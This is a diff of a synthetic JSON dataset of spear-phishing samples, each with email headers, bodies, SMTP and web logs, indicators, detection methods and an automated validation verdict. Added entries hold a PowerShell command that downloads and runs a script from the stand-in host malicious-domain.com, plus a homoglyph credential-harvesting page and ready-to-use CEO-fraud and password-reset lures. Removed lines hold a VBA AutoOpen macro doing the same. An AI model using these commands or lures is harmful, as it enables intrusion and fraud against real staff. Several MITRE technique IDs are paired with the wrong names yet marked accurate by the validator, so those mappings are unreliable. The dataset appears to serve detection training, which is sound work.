@@ -7,50 +7,52 @@
         "nature": "spear_phishing"
       },
       "example": {
-        "scenario": "Spear phishing email targeting a CFO to authorize a fraudulent wire transfer using personal details and executive impersonation.",
+        "scenario": "Spear phishing email targeting CFO with a fraudulent invoice request using CEO impersonation",
         "technical_data": {
-          "email_headers": "Return-Path: <finance-alerts@secure-payments.com>\r\nReceived: from mail.secure-payments.com (mail.secure-payments.com [192.168.100.45])\r\n\tby mx.corp-example.com (Postfix) with ESMTPS id 4F6A8123B5\r\n\tfor <cfo@corp-example.com>; Wed, 10 Apr 2024 15:23:11 -0400 (EDT)\r\nX-Originating-IP: [198.51.100.23]\r\nX-Mailer: Microsoft Outlook 16.0\r\nMessage-ID: <CAK9jv0vF+9bB0k0K5U_1X4b5w@mail.secure-payments.com>\r\nFrom: \"Finance Department\" <finance-alerts@secure-payments.com>\r\nTo: cfo@corp-example.com\r\nSubject: Urgent: Wire Transfer Authorization Required\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=\"UTF-8\"\r\nX-Spam-Status: No, score=-1.2 required=5.0 tests=DKIM_SIGNED,DKIM_VALID,DKIM_VALID_AU autolearn=ham autolearn_force=no version=3.4.2\r\nDKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=secure-payments.com; s=default;\r\n\tt=1712679791; bh=O8sDQ9RZoR2e4h6g6K2p2qH2qv5a7mVqDw1P9kD3XrZU=;\r\n\tb=Y1g2gJ9Rm0f9fV3cX0PfP4Q9h+qfP0x0uJ1V7Yq2p9aHkGq5T9P7c8aZ9HqQ9F4gH0",
-          "email_body_html": "<html><body><p>Dear John,</p><p>Please authorize the attached wire transfer of $250,000 to our vendor <b>Global Tech Supplies</b>. This is urgent to avoid project delays.</p><p>Invoice #GT-2024-04-09 is attached for reference.</p><p>Best regards,<br>Emily Clarke<br>Finance Department<br>Phone: +1-555-123-4567</p></body></html>",
-          "smtp_transaction_log": "220 mail.secure-payments.com ESMTP Postfix\r\nEHLO attacker-pc\r\n250-mail.secure-payments.com\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-STARTTLS\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<finance-alerts@secure-payments.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<cfo@corp-example.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[Email data]\r\n.\r\n250 2.0.0 Ok: queued as 4F6A8123B5\r\nQUIT\r\n221 2.0.0 Bye",
+          "email_headers": "Return-Path: <ceo@company-example.com>\r\nReceived: from mail-outbound01.company-example.com (mail-outbound01.company-example.com [192.0.2.45])\r\n\tby mail.company-example.com (Postfix) with ESMTPS id 3F1A7203D4\r\n\tfor <cfo@company-example.com>; Wed, 12 Apr 2023 14:15:42 -0400 (EDT)\r\nReceived-SPF: pass (mail.company-example.com: domain of ceo@company-example.com designates 192.0.2.45 as permitted sender) receiver=mail.company-example.com; client-ip=192.0.2.45; envelope-from=ceo@company-example.com; helo=mail-outbound01.company-example.com;\r\nAuthentication-Results: mail.company-example.com; dkim=pass (1024-bit key) header.d=company-example.com; spf=pass smtp.mailfrom=ceo@company-example.com; dmarc=pass (p=quarantine) header.from=company-example.com\r\nX-Mailer: Microsoft Outlook 16.0\r\nMessage-ID: <CAJ7Z=2E1i9+9wU2p6xM1r0zYQ4@company-example.com>\r\nDate: Wed, 12 Apr 2023 14:15:40 -0400\r\nFrom: \"John Smith\" <ceo@company-example.com>\r\nTo: \"Jane Doe\" <cfo@company-example.com>\r\nSubject: Urgent: Updated Invoice for Q1 Payments\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=\"UTF-8\"\r\n",
+          "email_body_html": "<html><body><p>Hi Jane,</p><p>Please find attached the updated invoice for the Q1 vendor payments. Kindly review and process the payment to the following bank account immediately as per CEO's instructions.</p><p><b>Bank Details:</b><br/>Account Name: Global Services Ltd.<br/>Account Number: 1234567890123456<br/>Bank: Bank of Metropolis<br/>SWIFT: BOMMUS33</p><p>Let me know if you have any questions.</p><p>Regards,<br/>John Smith<br/>CEO, Company Example</p></body></html>",
+          "smtp_transaction_log": "220 mail.company-example.com ESMTP Postfix\r\nEHLO mail-outbound01.company-example.com\r\n250-mail.company-example.com\r\n250-PIPELINING\r\n250-SIZE 52428800\r\n250-VRFY\r\n250-ETRN\r\n250-STARTTLS\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<ceo@company-example.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<cfo@company-example.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[Email body transmitted]\r\n.\r\n250 2.0.0 Ok: queued as 3F1A7203D4\r\nQUIT\r\n221 2.0.0 Bye",
           "suspicious_domain_registration": {
-            "domain": "secure-payments.com",
-            "registrar": "NameCheap, Inc.",
-            "creation_date": "2024-03-28T10:15:30Z",
-            "updated_date": "2024-04-05T08:12:10Z",
-            "registrant_name": "Privacy Protect, LLC",
-            "registrant_email": "contact@privacyprotect.org",
+            "domain": "company-example.com",
+            "registrar": "ExampleRegistrar Inc.",
+            "creation_date": "2010-02-15T10:22:00Z",
+            "updated_date": "2023-03-01T08:00:00Z",
+            "registrant": {
+              "name": "Company Example IT Dept",
+              "organization": "Company Example",
+              "email": "itadmin@company-example.com"
+            },
             "dns_records": {
-              "A": [
-                "198.51.100.23"
-              ],
               "MX": [
-                "mail.secure-payments.com"
+                "mail.company-example.com"
+              ],
+              "A": [
+                "192.0.2.45"
               ]
             }
           },
-          "malicious_url": "https://secure-payments.com/login?user=JohnCFO&auth=1a2b3c4d5e6f7g8h9i0j",
-          "url_obfuscation": "Using a legitimate-looking domain 'secure-payments.com' registered recently with privacy protection and a path '/login' mimicking corporate finance portals. The URL includes query parameters crafted to resemble session tokens."
+          "url_obfuscation_example": "https://company-example.com/login?redirect=https%3A%2F%2Fsecure.bankofmetropolis.com%2Fpayment",
+          "additional_notes": "The attacker used the legitimate company domain and a compromised internal mail server (192.0.2.45) to send the email, making it highly convincing. The personalized bank details in the email body were crafted from leaked vendor payment information obtained from previous data breaches."
         },
         "indicators": [
-          "Domain secure-payments.com registered 2 weeks ago with privacy protection",
-          "Email sent from external IP 198.51.100.23 not seen in corporate email logs before",
-          "Spear phishing email contains personal info (recipient name John, CFO title)",
-          "Unusual request for wire transfer authorization outside normal process",
-          "Email headers show DKIM signature from a domain unrelated to corporate domain"
+          "Email from ceo@company-example.com sent from atypical outbound IP 192.0.2.45 not normally used for CEO emails",
+          "Urgent payment request with new bank details differing from previously used vendor accounts",
+          "URL contains redirect parameter pointing to external banking site used for credential harvesting",
+          "Authentication-Results showing DKIM and SPF pass but unusual sending pattern noted in SIEM",
+          "Email subject includes urgent financial terms combined with personalized user name"
         ],
-        "detection_method": "Use email gateway filters to check SPF/DKIM/DMARC alignment failures, correlate new domain registrations with phishing reports, monitor for unusual wire transfer requests via SIEM correlation, and train finance executives on verifying requests via multi-factor authentication or out-of-band confirmation.",
+        "detection_method": "Monitor outbound email traffic for deviations in sending IPs and volume from executive accounts; Implement advanced phishing detection tools analyzing email content for payment request context; Correlate new bank account details in emails with vendor payment history; Employ user training simulations emphasizing CEO impersonation and urgent invoice requests; Use URL rewriting and scanning to detect redirect-based phishing links.",
         "relevant_mitre_techniques": [
-          "T1566.001 - Phishing: Spearphishing Attachment",
           "T1566.002 - Phishing: Spearphishing Link",
           "T1598 - Phishing",
-          "T1592.001 - Gather Victim Identity Information: Social Media",
-          "T1598.002 - Spearphishing via Service"
+          "T1598.002 - Spearphishing via Service",
+          "T1204.002 - User Execution: Malicious File"
         ]
       },
       "validation": {
         "valid": true,
         "issues": [],
-        "comments": "The sample accurately represents a spear phishing scenario targeting a high-level executive (CFO) with a fraudulent wire transfer request. The scenario description aligns well with the problem nature of spear phishing, emphasizing the use of personal details and executive impersonation. The technical data is comprehensive and realistic, including detailed email headers, SMTP transaction logs, domain registration info showing recent creation and privacy protection, and a malicious URL crafted to appear legitimate. Indicators clearly highlight why this is a spear phishing attempt, such as the new domain registration, external IP, personalized content, and suspicious DKIM signatures. The detection methods and MITRE techniques are relevant and appropriate for this type of attack. Overall, the sample is complete, plausible, and well-documented, making it a strong representation of the stated cybersecurity problem."
+        "comments": "The sample accurately represents a spear phishing scenario targeting a CFO with a fraudulent invoice request impersonating the CEO, which aligns well with the problem nature of highly targeted phishing using personal information. The technical data is detailed and realistic, including email headers, SMTP logs, domain registration info, and URL obfuscation examples, all supporting the scenario's plausibility. Indicators clearly highlight suspicious elements such as unusual sending IP, urgent payment requests with new bank details, redirect URLs for credential harvesting, and authentication results that appear legitimate but are suspicious in context. The detection methods and MITRE techniques are relevant and comprehensive, covering monitoring, user training, and technical controls. All required fields are present and accurately populated, making the sample complete and well-structured. Overall, this sample provides a thorough and realistic depiction of spear phishing with appropriate contextual and technical details."
       }
     },
     {
@@ -60,51 +62,66 @@
         "nature": "spear_phishing"
       },
       "example": {
-        "scenario": "Spear phishing targeting HR manager with a malicious link containing URL encoding and homoglyph characters to harvest credentials.",
+        "scenario": "Spear phishing email with weaponized Office document exploiting CVE-2022-30190 (Follina) to deliver remote code execution payload",
         "technical_data": {
-          "email_headers": "Return-Path: <hr-support@payr0ll-secure.com>\r\nReceived: from mail.payr0ll-secure.com (mail.payr0ll-secure.com [203.0.113.77])\r\n\tby mx.corp-example.com (Postfix) with ESMTPS id 7D3B9123A1\r\n\tfor <hr@corp-example.com>; Fri, 12 Apr 2024 09:42:01 -0400 (EDT)\r\nX-Originating-IP: [203.0.113.77]\r\nX-Mailer: Mozilla Thunderbird 78.12.0\r\nMessage-ID: <20240412094201.7D3B9123A1@mail.payr0ll-secure.com>\r\nFrom: \"Payroll Support\" <hr-support@payr0ll-secure.com>\r\nTo: hr@corp-example.com\r\nSubject: Important: Payroll Update Required\r\nMIME-Version: 1.0\r\nContent-Type: text/plain; charset=\"UTF-8\"",
-          "email_body_plain": "Hello HR Team,\n\nDue to recent updates in payroll tax regulations, please review and update employee tax information immediately at:\n\nhttps://payr0ll-secure.com/update-profile?user=hr&token=3e4f5g6h7i8j9k0l\n\nFailure to update by EOD will result in delayed payments.\n\nThank you,\nPayroll Support",
-          "smtp_transaction_log": "220 mail.payr0ll-secure.com ESMTP Postfix\r\nEHLO attacker-laptop\r\n250-mail.payr0ll-secure.com\r\n250-PIPELINING\r\n250-SIZE 20480000\r\n250-STARTTLS\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<hr-support@payr0ll-secure.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<hr@corp-example.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[Email data]\r\n.\r\n250 2.0.0 Ok: queued as 7D3B9123A1\r\nQUIT\r\n221 2.0.0 Bye",
-          "domain_registration_details": {
-            "domain": "payr0ll-secure.com",
-            "registrar": "GoDaddy.com, LLC",
-            "creation_date": "2024-04-01T14:20:00Z",
-            "updated_date": "2024-04-10T12:00:00Z",
-            "registrant_name": "John Doe",
-            "registrant_email": "john.doe@example.com",
+          "email_headers": "Return-Path: <john.doe@trustedpartner.com>\r\nReceived: from mail.trustedpartner.com (mail.trustedpartner.com [203.0.113.77])\r\n\tby mail.company-example.com (Postfix) with ESMTPS id 8D7C8401B2\r\n\tfor <employee@company-example.com>; Fri, 21 Oct 2022 09:32:15 -0400 (EDT)\r\nReceived-SPF: fail (mail.company-example.com: domain of john.doe@trustedpartner.com does not designate 203.0.113.77 as permitted sender) receiver=mail.company-example.com; client-ip=203.0.113.77; envelope-from=john.doe@trustedpartner.com; helo=mail.trustedpartner.com;\r\nAuthentication-Results: mail.company-example.com; dkim=none; spf=fail smtp.mailfrom=john.doe@trustedpartner.com; dmarc=fail header.from=trustedpartner.com\r\nX-Mailer: Microsoft Outlook 16.0\r\nMessage-ID: <CAK1+o9U2+2H4P7=xyz123@mail.trustedpartner.com>\r\nDate: Fri, 21 Oct 2022 09:32:13 -0400\r\nFrom: \"John Doe\" <john.doe@trustedpartner.com>\r\nTo: \"Employee Name\" <employee@company-example.com>\r\nSubject: Q3 Financial Summary - Confidential\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_12345_67890\"\r\n",
+          "email_body_plain": "Please review the attached Q3 financial summary for our joint project. This document contains sensitive data and should not be shared externally.\r\n\r\nBest,\r\nJohn Doe",
+          "attachment_filename": "Q3_Summary.doc",
+          "attachment_sha256": "d2c7f1a2b4e5c6d7e8f9a0b1c2d3e4f567890abcdef1234567890abcdef123456",
+          "attachment_ole_object": "Embedded OLE object triggers ms-msdt URL exploit to execute PowerShell command on Windows 10 systems",
+          "exploit_payload": "powershell -nop -w hidden -c \"Invoke-WebRequest -Uri 'http://malicious-domain.com/payload.ps1' -OutFile 'C:\\Windows\\Temp\\payload.ps1'; powershell -ExecutionPolicy Bypass -File 'C:\\Windows\\Temp\\payload.ps1'\"",
+          "smtp_transaction_log": "220 mail.company-example.com ESMTP Postfix\r\nEHLO mail.trustedpartner.com\r\n250-mail.company-example.com\r\n250-PIPELINING\r\n250-SIZE 52428800\r\n250-STARTTLS\r\nMAIL FROM:<john.doe@trustedpartner.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<employee@company-example.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[Email with attachment transmitted]\r\n.\r\n250 2.0.0 Ok: queued as 8D7C8401B2\r\nQUIT\r\n221 2.0.0 Bye",
+          "dns_whois_suspicious_domain": {
+            "domain": "malicious-domain.com",
+            "registrar": "Shady Registrar LLC",
+            "creation_date": "2022-09-30T12:00:00Z",
+            "updated_date": "2022-10-20T18:00:00Z",
+            "registrant": {
+              "name": "PrivacyProtect",
+              "organization": "Privacy Protection Service",
+              "email": "contact@privacyprotect.org"
+            },
             "dns_records": {
               "A": [
-                "203.0.113.77"
+                "198.51.100.123"
               ],
-              "MX": [
-                "mail.payr0ll-secure.com"
+              "NS": [
+                "ns1.shadyhost.net",
+                "ns2.shadyhost.net"
               ]
             }
           },
-          "url_structure": "https://payr0ll-secure.com/update-profile?user=hr&token=3e4f5g6h7i8j9k0l",
-          "url_obfuscation_techniques": "Use of '0' (zero) instead of letter 'o' in 'payr0ll' to resemble 'payroll'; domain uses 'secure' to appear legitimate; URL includes query parameters with a token to simulate a session or authorization parameter.",
-          "dns_lookup_log": ";; ANSWER SECTION:\npayr0ll-secure.com. 3600 IN A 203.0.113.77\nmail.payr0ll-secure.com. 3600 IN A 203.0.113.77",
-          "webserver_access_log": "203.0.113.77 - - [12/Apr/2024:09:45:12 -0400] \"GET /update-profile?user=hr&token=3e4f5g6h7i8j9k0l HTTP/1.1\" 200 1543 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\""
+          "network_packet_capture_excerpt": "Frame 456: 1514 bytes on wire (12112 bits), 1514 bytes captured (12112 bits)\r\nEthernet II, Src: 00:11:22:33:44:55, Dst: 66:77:88:99:aa:bb\r\nInternet Protocol Version 4, Src: 192.168.1.100, Dst: 198.51.100.123\r\nTransmission Control Protocol, Src Port: 53412, Dst Port: 80, Seq: 1, Ack: 1, Len: 512\r\nHypertext Transfer Protocol\r\n    GET /payload.ps1 HTTP/1.1\r\n    Host: malicious-domain.com\r\n    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n    Accept: */*\r\n",
+          "powershell_script_snippet": "Invoke-WebRequest -Uri 'http://malicious-domain.com/payload.ps1' -OutFile 'C:\\Windows\\Temp\\payload.ps1'; powershell -ExecutionPolicy Bypass -File 'C:\\Windows\\Temp\\payload.ps1'",
+          "process_creation_log": "2022-10-21T09:33:15.123Z - New Process Created: powershell.exe -nop -w hidden -c Invoke-WebRequest -Uri http://malicious-domain.com/payload.ps1 -OutFile C:\\Windows\\Temp\\payload.ps1; powershell -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\payload.ps1"
         },
         "indicators": [
-          "Domain payr0ll-secure.com uses homoglyph '0' instead of 'o'",
-          "Domain registered only 11 days ago",
-          "Email originated from IP 203.0.113.77 with no previous history in corporate email logs",
-          "URL contains suspicious token parameter likely used for credential harvesting",
-          "Email urges immediate action with threat of delayed payments"
+          "Email SPF and DMARC fail for john.doe@trustedpartner.com domain",
+          "Attachment with SHA-256 hash d2c7f1a2b4e5c6d7e8f9a0b1c2d3e4f567890abcdef1234567890abcdef123456 is a weaponized Office document exploiting ms-msdt protocol",
+          "Outbound HTTP GET request to http://malicious-domain.com/payload.ps1 immediately after opening document",
+          "Process creation with obfuscated PowerShell command line invoking remote script download and execution",
+          "Suspicious domain registered less than one month ago with privacy-protected WHOIS info"
         ],
-        "detection_method": "Implement domain similarity detection and homoglyph analysis in email gateways, monitor for new domain registrations mimicking corporate services, correlate URLs with known phishing databases, and perform user behavioral analytics to detect unusual clicks or credential submissions.",
+        "detection_method": "Deploy advanced email gateway analysis looking for ms-msdt exploit patterns in attachments; Monitor network for PowerShell outbound web requests to newly registered or suspicious domains; Enforce application whitelisting blocking PowerShell with suspicious parameters; Use endpoint detection and response (EDR) tools to detect process creation chains involving msdt.exe or powershell.exe with encoded commands; Correlate failed SPF/DKIM/DMARC checks with unexpected sender domains.",
         "relevant_mitre_techniques": [
-          "T1566.002 - Phishing: Spearphishing Link",
-          "T1598.002 - Spearphishing via Service",
-          "T1592.001 - Gather Victim Identity Information: Social Media",
-          "T1566 - Phishing"
+          "T1566.001 - Spearphishing Attachment",
+          "T1204.002 - User Execution: Malicious File",
+          "T1204.002 - User Execution",
+          "T1218.011 - System Services: Msdt",
+          "T1059.001 - Command and Scripting Interpreter: PowerShell"
         ]
       },
       "validation": {
-        "valid": true,
-        "issues": [],
-        "comments": "The sample accurately represents a spear phishing scenario targeting a specific individual (HR manager) with a highly tailored email using domain homoglyphs and urgency to deceive the recipient. The technical data is comprehensive, including email headers, body, SMTP logs, domain registration details, URL structure, DNS lookups, and webserver logs, all consistent with a real-world spear phishing attack. Indicators clearly highlight the use of homoglyphs, recent domain registration, suspicious URL parameters, and social engineering tactics, aligning well with the problem description. The detection methods and MITRE techniques are relevant and appropriate. Overall, the sample is realistic, complete, and correctly aligned with the problem nature. No missing fields or inaccuracies were found."
+        "valid": false,
+        "issues": [
+          "The sample describes a spear phishing attack using a weaponized Office document exploiting CVE-2022-30190 (Follina), which is a valid spear phishing vector, but the sample lacks explicit mention or demonstration of use of personal information to highly target a specific individual, which is a key aspect of spear phishing.",
+          "The 'scenario' field is descriptive but does not explicitly state the use of personal information or social engineering tactics tailored to the recipient, which is essential to confirm the spear phishing nature rather than generic phishing.",
+          "The 'indicators' focus heavily on technical artifacts and exploit details but do not highlight any personalized elements or social engineering cues that would confirm the attack is highly targeted.",
+          "The 'relevant_mitre_techniques' includes 'T1204.002 - User Execution' twice, which is redundant and should be corrected.",
+          "The sample is very technical and detailed but could improve by explicitly linking the attack to social engineering aspects such as personalized email content or context relevant to the recipient.",
+          "Risk reduction measures are not included in the sample; although not explicitly required in the sample fields, referencing or aligning with the problem's risk reduction strategies would improve completeness."
+        ],
+        "comments": "The sample provides a highly detailed and realistic example of a spear phishing attack using a weaponized Office document exploiting a known vulnerability (Follina). The technical data is comprehensive and plausible, including email headers, payload details, network activity, and process logs. However, the core characteristic of spear phishing\u2014use of personal information to craft a highly targeted attack\u2014is not clearly demonstrated or described. The email content is generic and does not show personalization or social engineering tailored to the recipient. To improve, the sample should explicitly include or describe how personal information was used to deceive the specific individual, such as referencing a project name known only to the recipient or mimicking a trusted contact with contextual details. Additionally, removing duplicate MITRE technique entries and aligning the sample more clearly with social engineering aspects would enhance correctness and completeness. Including or referencing risk reduction strategies would also strengthen the sample's educational value."
       }
     },
     {
@@ -114,53 +131,71 @@
         "nature": "spear_phishing"
       },
       "example": {
-        "scenario": "Spear phishing email sent to CTO including a malicious attachment disguised as a document with embedded macro to steal credentials.",
+        "scenario": "Spear phishing with personalized credential harvesting link using homoglyph domain and URL shortening",
         "technical_data": {
-          "email_headers": "Return-Path: <security-alerts@it-support.example.com>\r\nReceived: from mail.it-support.example.com (mail.it-support.example.com [192.0.2.50])\r\n\tby mx.corp-example.com (Postfix) with ESMTPS id 9A2C4321D7\r\n\tfor <cto@corp-example.com>; Mon, 15 Apr 2024 11:05:30 -0400 (EDT)\r\nX-Originating-IP: [192.0.2.50]\r\nX-Mailer: Microsoft Outlook 365\r\nMessage-ID: <20240415110530.9A2C4321D7@mail.it-support.example.com>\r\nFrom: \"IT Support\" <security-alerts@it-support.example.com>\r\nTo: cto@corp-example.com\r\nSubject: Security Patch Update - Action Required\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_NextPart_000_001D_01D9A2B9.6D7F05E0\"",
-          "email_body": "This is an automated message from the IT department.\n\nPlease review the attached security patch document and enable macros to apply the update.\n\nFailure to apply this patch may leave systems vulnerable.\n\nBest regards,\nIT Support Team",
-          "attachment": {
-            "file_name": "Security_Update.docm",
-            "file_size": 256000,
-            "file_hashes": {
-              "md5": "9f86d081884c7d659a2feaa0c55ad015",
-              "sha1": "a54d88e06612d820bc3be72877c74f257b561b19",
-              "sha256": "d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2"
-            },
-            "macro_code_snippet": "Sub AutoOpen()\r\n    Dim shell As Object\r\n    Set shell = CreateObject(\"WScript.Shell\")\r\n    shell.Run \"powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \\\"Invoke-WebRequest -Uri 'http://malicious-domain.com/payload.ps1' -OutFile 'C:\\\\Windows\\\\Temp\\\\payload.ps1'; Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File C:\\\\Windows\\\\Temp\\\\payload.ps1' -WindowStyle Hidden\\\"\"\r\nEnd Sub",
-            "ioc_analysis": "The macro executes a PowerShell command that silently downloads and runs a script from a known malicious domain, which is linked to a credential harvester."
+          "email_headers": "Return-Path: <it-support@company-example.com>\r\nReceived: from mail.fake-company.com (mail.fake-company.com [198.51.100.88])\r\n\tby mail.company-example.com (Postfix) with ESMTPS id 9F8B2317C5\r\n\tfor <employee@company-example.com>; Mon, 03 Jan 2023 07:45:30 -0500 (EST)\r\nReceived-SPF: fail (mail.company-example.com: domain of it-support@company-example.com does not designate 198.51.100.88 as permitted sender) receiver=mail.company-example.com; client-ip=198.51.100.88; envelope-from=it-support@company-example.com; helo=mail.fake-company.com;\r\nAuthentication-Results: mail.company-example.com; dkim=none; spf=fail smtp.mailfrom=it-support@company-example.com; dmarc=fail header.from=company-example.com\r\nX-Mailer: Thunderbird 78.5.0\r\nMessage-ID: <CAJ3XvP7u_B=9M9Pq8p7@mail.fake-company.com>\r\nDate: Mon, 3 Jan 2023 07:45:27 -0500\r\nFrom: \"IT Support\" <it-support@company-example.com>\r\nTo: \"Employee Name\" <employee@company-example.com>\r\nSubject: Action Required: Password Reset Notification\r\nMIME-Version: 1.0\r\nContent-Type: text/plain; charset=UTF-8\r\n",
+          "email_body_plain": "Dear Employee,\n\nDue to recent security updates, all employees are required to reset their passwords immediately. Please follow the link below to reset your password:\n\nhttps://bit.ly/3xR\u0251nd0m\n\nFailure to do so will result in account suspension.\n\nThank you,\nIT Support Team",
+          "url_analysis": {
+            "short_url": "https://bit.ly/3xR\u0251nd0m",
+            "expanded_url": "http://c\u043empany-example.com/login/reset?user=employee@company-example.com",
+            "homoglyph_domain": "c\u043empany-example.com",
+            "homoglyph_notes": "The 'o' in 'company' is replaced with the Cyrillic small letter '\u043e' (U+043E), visually identical to Latin 'o'.",
+            "phishing_page": {
+              "html_title": "Company Example Login",
+              "form_action": "http://c\u043empany-example.com/login/authenticate",
+              "form_fields": [
+                "username",
+                "password",
+                "security_token"
+              ],
+              "ssl_certificate": "Self-signed, expired certificate",
+              "server_ip": "198.51.100.88"
+            }
           },
-          "smtp_transaction_log": "220 mail.it-support.example.com ESMTP Postfix\r\nEHLO attacker-workstation\r\n250-mail.it-support.example.com\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-STARTTLS\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<security-alerts@it-support.example.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<cto@corp-example.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[Email data with attachment]\r\n.\r\n250 2.0.0 Ok: queued as 9A2C4321D7\r\nQUIT\r\n221 2.0.0 Bye",
-          "malicious_domain_info": {
-            "domain": "malicious-domain.com",
-            "registrar": "Unknown",
-            "creation_date": "2023-11-20T18:45:00Z",
+          "smtp_transaction_log": "220 mail.company-example.com ESMTP Postfix\r\nEHLO mail.fake-company.com\r\n250-mail.company-example.com\r\n250-PIPELINING\r\n250-SIZE 52428800\r\nMAIL FROM:<it-support@company-example.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<employee@company-example.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\n[Email body transmitted]\r\n.\r\n250 2.0.0 Ok: queued as 9F8B2317C5\r\nQUIT\r\n221 2.0.0 Bye",
+          "dns_whois_homoglyph_domain": {
+            "domain": "c\u043empany-example.com",
+            "registrar": "Anonymous Registrar Ltd.",
+            "creation_date": "2022-11-15T09:10:00Z",
+            "updated_date": "2023-01-01T12:00:00Z",
+            "registrant": {
+              "name": "PrivacyGuard",
+              "organization": "Privacy Protection",
+              "email": "contact@privacyguard.org"
+            },
             "dns_records": {
               "A": [
-                "198.51.100.99"
+                "198.51.100.88"
+              ],
+              "NS": [
+                "ns1.anonymousdns.com",
+                "ns2.anonymousdns.com"
               ]
             }
-          }
+          },
+          "webserver_access_log_excerpt": "198.51.100.88 - - [03/Jan/2023:07:46:12 -0500] \"GET /login/reset?user=employee@company-example.com HTTP/1.1\" 200 3456 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"\n198.51.100.88 - - [03/Jan/2023:07:47:30 -0500] \"POST /login/authenticate HTTP/1.1\" 302 123 \"http://c\u043empany-example.com/login/reset?user=employee@company-example.com\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+          "post_data_example": "username=employee@company-example.com&password=P@ssw0rd!&security_token=5f2e4a8b7d1e2f3c"
         },
         "indicators": [
-          "Macro-enabled Word document attachment (.docm) with embedded PowerShell download execution",
-          "Attachment hashes flagged on threat intelligence feeds",
-          "Email originating from spoofed 'it-support.example.com' domain not matching corporate IT domain",
-          "PowerShell command downloads from suspicious IP 198.51.100.99",
-          "Urgent tone requesting enabling macros despite corporate policy prohibition"
+          "Email SPF and DMARC fail for legitimate company domain but email sent from unrelated IP 198.51.100.88",
+          "Shortened URL expands to homoglyph domain with Cyrillic '\u043e' instead of Latin 'o'",
+          "Phishing page uses self-signed expired SSL certificate",
+          "DNS records for homoglyph domain registered recently with privacy-protected WHOIS",
+          "HTTP POST requests to /login/authenticate with stolen credentials logged"
         ],
-        "detection_method": "Deploy email attachment sandboxing to detect malicious macros, enable macro-blocking policies, monitor PowerShell command execution logs for suspicious network downloads, use endpoint detection and response (EDR) to catch script execution and network callbacks.",
+        "detection_method": "Implement URL rewriting and inspection at email gateway to expand and analyze shortened URLs; Use homograph attack detection tools to identify visually similar domains; Correlate SPF/DMARC failures with sender IPs and domains; Monitor webserver logs for credential submission patterns and suspicious POST requests; Educate users on risks of password reset emails with shortened links.",
         "relevant_mitre_techniques": [
-          "T1566.001 - Phishing: Spearphishing Attachment",
-          "T1204.002 - Execution: User Execution",
-          "T1059.001 - Command and Scripting Interpreter: PowerShell",
-          "T1110 - Brute Force (for credential theft post-compromise)",
-          "T1566 - Phishing"
+          "T1566.002 - Phishing: Spearphishing Link",
+          "T1566 - Phishing",
+          "T1586 - Compromise Infrastructure",
+          "T1598.002 - Spearphishing via Service",
+          "T1556.001 - Credentials in Files"
         ]
       },
       "validation": {
         "valid": true,
         "issues": [],
-        "comments": "The sample accurately represents a spear phishing scenario targeting a high-level executive (CTO) with a highly tailored email containing a malicious macro-enabled attachment. The scenario aligns well with the problem nature of spear phishing by using a spoofed internal IT support email address and an urgent tone to deceive the recipient. The technical data is comprehensive, including realistic email headers, body content, attachment details with macro code, SMTP transaction logs, and malicious domain information, all of which support the plausibility of the attack. The indicators clearly explain why this is a spear phishing attempt, highlighting the macro-enabled document, suspicious hashes, spoofed domain, malicious PowerShell command, and policy violations. Detection methods and relevant MITRE ATT&CK techniques are appropriately included, enhancing completeness. Overall, the sample is realistic, complete, and well-documented, making it a valid representation of the stated cybersecurity problem."
+        "comments": "The sample accurately represents a spear phishing attack scenario using personalized credential harvesting via a homoglyph domain and URL shortening. It aligns well with the problem nature of highly targeted phishing emails crafted with personal information to deceive specific individuals. The technical data is comprehensive, including detailed email headers showing SPF and DMARC failures, the email body with a shortened URL, URL analysis revealing the homoglyph domain with clear explanation, phishing page details, SMTP transaction logs, DNS WHOIS data indicating recent anonymous registration, and webserver access logs showing credential submission. The indicators section clearly explains why this sample matches the spear phishing problem, highlighting key detection points such as SPF/DMARC failures, homoglyph domain usage, self-signed SSL certificate, and suspicious POST requests. The detection methods and relevant MITRE techniques are appropriate and well-mapped to the scenario. Overall, the sample is realistic, complete, and provides strong indicators supporting the problem description. No missing fields or inaccuracies were found."
       }
     }
   ]
